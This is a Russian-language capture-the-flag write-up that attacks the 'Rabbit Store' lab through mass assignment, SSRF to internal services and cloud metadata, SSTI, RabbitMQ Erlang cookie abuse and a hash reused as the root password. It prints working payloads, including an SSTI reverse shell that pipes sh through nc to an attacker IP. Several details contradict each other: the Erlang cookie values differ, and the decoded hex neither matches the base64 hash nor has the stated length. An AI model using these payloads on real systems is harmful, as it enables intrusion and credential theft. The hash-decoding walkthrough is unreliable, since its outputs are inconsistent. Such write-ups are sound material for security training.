# Отчёт о проникновении в веб-приложение «Rabbit Store»

## 1. Введение

В рамках задания проводилось тестирование на проникновение веб-приложения для хранения файлов. Цель — получить пользовательский и root-флаги. В отчёте последовательно описаны **все** этапы работы, включая **все попытки решения**, удачные и неудачные, с пояснениями, почему был выбран тот или иной вектор.


## 2. Первичная разведка

### 2.1. Сканирование портов (nmap)

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux
```

**Вывод:** два открытых порта — SSH и HTTP. Apache редиректит на `cloudsite.thm`. Добавляем в `/etc/hosts` запись `cloudsite.thm`.

### 2.2. Исследование веб-приложения

На главной странице обнаружена ссылка на авторизацию и создание аккаунта:
```
http://storage.cloudsite.thm/register.html
```

Добавляем в `/etc/hosts` запись `storage.cloudsite.thm`.

На сайте представлены страницы: `about_us.html`, `services.html`, `blog.html`, `contact_us.html`. На странице `contact_us` — форма. На остальных страницах ничего интересного.

### 2.3. Фаззинг скрытых директорий и файлов

Фаззинг директорий и файлов **ничего интересного не дал**.

На главной странице представлены почты:
```
info@smarteyeapps.com
sales@smarteyeapps.com
```


## 3. Взаимодействие с формой авторизации

### 3.1. Регистрация

Успешно зарегистрировался под `test@test.test:test`.

### 3.2. Попытка авторизации через `/api/login`

Ответ:
```
Sorry, this service is only for internal users working within the organization and our clients.
If you are one of our clients, please ask the administrator to activate your subscription.
```

В куках установлен токен:
```
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC50ZXN0Iiwic3Vic2NyaXB0aW9uIjoiaW5hY3RpdmUiLCJpYXQiOjE3OTE5NzI1NjgsImV4cCI6MTc5MTk3NjE2OH0.FaRwWDIXSREOUFtR_LT7eQrbzJ7HbhoAs3eCP_tf7js;
```

Возвращён ответ **`inactive`**.

### 3.3. Попытка авторизации под `sales@smarteyeapps.com`

Попытка авторизации `sales@smarteyeapps.com:test` дала ошибку:
```
Invalid Email Or Password
```


## 4. Декодирование токена JWT

Декодируем payload JWT:
```json
{
  "email": "test@test.test",
  "subscription": "inactive",
}
```

### 4.1. Попытки обхода JWT

- **Подделка только Payload** — **не помогла**, подпись проверяется.
- **Алгоритм `alg:none`** — **не сработал**.
- **Подбор секрета** через `jwt2john.py` и `john` (включая rockyou и jwt.secrets.list) — **без успеха**.

**Вывод:** JWT-секрет не подбирается. Это **тупиковый путь** — уязвимость не в слабом секрете, а в **логике регистрации**.


## 5. Mass Assignment — обход подписки

### 5.1. Попытка зарегистрироваться с payload

```json
{"email":"test@test1.test","password":"test",
"subscription":"active"
}
```

**Удалось зарегистрироваться и войти в аккаунт.** Теперь появилась возможность **загрузки файла** и **скачивания файла по ссылке**.

**Вывод:** **Mass Assignment** — приложение принимает `subscription` при регистрации и **включает его в JWT без проверки**. Это и есть ключевая уязвимость.


## 6. Эксплуатация SSRF

### 6.1. Проверка SSRF

Попытка SSRF с payload:
```json
{"url":"http://192.168.135.182:8000/test.html"}
```

На нашем сервере зафиксировано обращение:
```
connect to [192.168.135.182] from (UNKNOWN) [10.130.164.46] 35378
GET /test.html HTTP/1.1
Accept: */*
User-Agent: node-fetch/1.0 (+https://github.com/bitinn/node-fetch)
Accept-Encoding: gzip,deflate
Host: 192.168.135.182:8000
Connection: close
```

**Вывод:** сервер **сам делает HTTP-запрос** по указанному URL. Это **SSRF**.

### 6.2. SSRF к `localhost`

Payload:
```json
{"url":"http://localhost"}
```

Ответ:
```json
{"message":"File stored from URL successfully","path":"/api/uploads/01698c7a-30ed-4b83-a742-b38589c13ab8"}
```

### 6.3. Попытка загрузить PHP-webshell

Загрузка PHP-webshell **прошла успешно**, но при переходе по URL файл **просто скачивается** — не исполняется.

### 6.4. Доступ к метаданным облака

Получение доступа к `http://169.254.169.254/latest/meta-data/`:
```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-keys/
reservation-id
security-groups
services/
system
```

Удалось получить данные `/latest/meta-data/security-credentials/vulnerable-machine`, но **скорее всего вектор не тот**.

### 6.5. Сканирование внутренних портов через SSRF

При `{"url":"http://127.0.0.1:8000/"}` — ответ `405 Method Not Allowed`.

При использовании других портов **5000, 8001, 8080** — ошибка:
```json
{"message":"Error storing file from URL"}
```

Попытка скачать файл с 8000:
```html
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

### 6.6. Найден эндпоинт `/api/docs`

`http://storage.cloudsite.thm/api/docs` — **`access denied`**.

Попытка достучаться через SSRF:
```json
{"url":"http://127.0.0.1:3000/api/docs"}
```

**На 3000 порту найден эндпоинт `/api/docs`.** Он содержит:
```
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user
```


## 7. Эксплуатация SSTI

### 7.1. Проверка `/api/fetch_messeges_from_chatbot`

Запрос без параметров:
```json
{"error": "username parameter is required"}
```

Запрос с `{"username":"hello"}`:
```html
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, hello, our chatbot server is currently under development.</h1>
 </body>
</html>
```

Запрос с `{"username":"{{7*7}}"}`:
```html
<h1>Sorry, 49, our chatbot server is currently under development.</h1>
```

**SSTI подтверждена** — `49 = 7*7`.

### 7.2. Получение reverse shell

Payload:
```json
{"username":"{{ config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.135.182 4444 >/tmp/f').read()) }}"}
```

**Получен reverse shell** и **прочитан первый флаг пользователя**.

## 8. Эскалация до rabbitmq

### 8.1. Поиск векторов для эскалации

```bash
sudo -l          # ничего
crontab -l       # ничего
find / -perm -4000  # ничего
```

Найден **запущенный от root процесс**:
```
root  1300  0.0  1.0 690584 42364 ?  Ssl  04:15  0:00 /usr/bin/node /root/forge_web_service/rabbitmq/worker.js
```

Найден **хост**:
```
127.0.1.1 forge
```

### 8.2. Erlang cookie

```bash
azrael@forge:/var/lib/rabbitmq$ cat .erlang.cookie
CkXPQURKa6W9FlV5
```

**Требование:** cookie должен иметь **права 0600** (доступен только владельцу). Но **cookie не имеет нужных пермишеннов** — это **уязвимость**.

### 8.3. Подключение к RabbitMQ через `erl`

```bash
erl -sname attacker -setcookie CkXPQURKa6W9FlV5 -remsh rabbit@forge
```

**Получен Erlang shell** от пользователя `rabbitmq`.

Отправляем reverse shell через `os:cmd`:
```erlang
os:cmd("id").
```

Результат:
```
uid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq)
```


## 9. Эскалация до root — работа с хешем RabbitMQ

### 9.1. Использование `export_definitions`

```bash
cd ~
echo "jGjFXltDZwCUYdjZ" > ~/.erlang.cookie
chmod 400 ~/.erlang.cookie
rabbitmqctl --node rabbit@forge export_definitions /tmp/definitions.json
```

### 9.2. Полученные данные

```bash
cat /tmp/definitions.json
```

```json
{"bindings":[],"exchanges":[],"global_parameters":[{"name":"cluster_name","value":"rabbit@forge"}],
"parameters":[],"permissions":[{"configure":".*","read":".*","user":"root","vhost":"/","write":".*"}],
"policies":[],"queues":[{"arguments":{},"auto_delete":false,"durable":true,"name":"tasks","type":"classic","vhost":"/"}],
"rabbit_version":"3.9.13","rabbitmq_version":"3.9.13","topic_permissions":[{"exchange":"","read":".*","user":"root","vhost":"/","write":".*"}],
"users":[{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},
"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. 
Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","tags":[]},
{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},
"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","tags":["administrator"]}]
,"vhosts":[{"limits":[],"metadata":{"description":"Default virtual host","tags":[]},"name":"/"}]}
```

**Ключевая находка:** в `definitions.json` **прямо написано**:
> «The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.»

Это **подсказка**: пароль root — это **не обычный пароль**, а **SHA-256 хеш** от пароля RabbitMQ.

### 9.3. Как работает хеширование паролей в RabbitMQ

**RabbitMQ** использует **соль + хеш**. Алгоритм:

1. **Генерируется случайная соль** длиной **4 байта**.
2. **Соль добавляется в начало пароля**: `salted = salt + password`.
3. **Вычисляется SHA-256**: `hash = SHA-256(salted)`.
4. **В файл сохраняется**: `base64(salt + hash)`.

**То есть `password_hash` в `definitions.json`** — это **base64 от (соль + SHA-256(соль + пароль))**.

**Формат:**
```
[соль: 4 байта][SHA-256 хеш: 32 байта]
```

### 9.4. Декодирование хеша

**Берём хеш `root`:**
```
49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF
```

**Декодируем из base64:**
```bash
echo -n '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 100
```

**Получаем hex:**
```
295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

**Разбор:**
- **Первые 8 hex-символов** (`295d1d16`) = **4 байта соли**.
- **Остальное** (`a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585`) = **SHA-256 хеш**.

### 9.5. Почему мы берём именно хеш как пароль

**В задаче разработчик допустил ошибку:** он **использовал SHA-256 хеш** от пароля RabbitMQ **как пароль системного root**. Об этом **прямо сказано** в `definitions.json`:

> «The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password.»

**То есть:**
- **Обычно:** `password_hash` = `base64(соль + SHA-256(соль + пароль))`. **Из него пароль не восстановить.**
- **В Rabbit Store:** разработчик **взял сам хеш** (hex-строку) и **установил его как пароль** системного root.

**Пароль root** = **hex-строка после соли**:
```
a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

### 9.6. Получение root

```bash
su root
# Вводим: a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

**Получаем root:**
```
uid=0(root) gid=0(root) groups=0(root)
```

**Читаем root flag.**


## 10. Разбор уязвимостей

| Уязвимость | Описание | Влияние |
|---|---|---|
| **Mass Assignment** | При регистрации можно передать `subscription: "active"` | Обход проверки подписки |
| **SSRF** | `/api/store-url` делает HTTP-запрос по указанному URL | Доступ к внутренним сервисам |
| **SSTI** | `/api/fetch_messeges_from_chatbot` не экранирует ввод | RCE |
| **Erlang cookie с слабыми правами** | `/var/lib/rabbitmq/.erlang.cookie` доступен | Доступ к RabbitMQ |
| **Хеш как пароль** | Разработчик использовал SHA-256 хеш как пароль root | Компрометация root |
| **Подсказка в JSON** | В `definitions.json` прямо написан пароль | Утечка |


## 11. Рекомендации

1. **Ограничить поля при регистрации** — использовать whitelist.
2. **Валидировать URL** в SSRF — блокировать `127.0.0.1`, `169.254.169.254`, внутренние IP.
3. **Экранировать шаблоны** — использовать `render_template` с параметрами, не `render_template_string`.
4. **Ограничить права на `.erlang.cookie`** — `chmod 400`.
5. **Не использовать хеши как пароли** — хранить пароли в защищённом виде.
6. **Не оставлять подсказки в конфигах** — убрать строку про пароль root.


## 13. Заключение

Задание пройдено полностью. Цепочка атаки: **Mass Assignment → SSRF → SSTI → RCE → RabbitMQ → root**. Ключевая ошибка — **использование SHA-256 хеша RabbitMQ как пароля системного root**, что позволило **декодировать хеш** и получить **root-доступ**. Все флаги получены.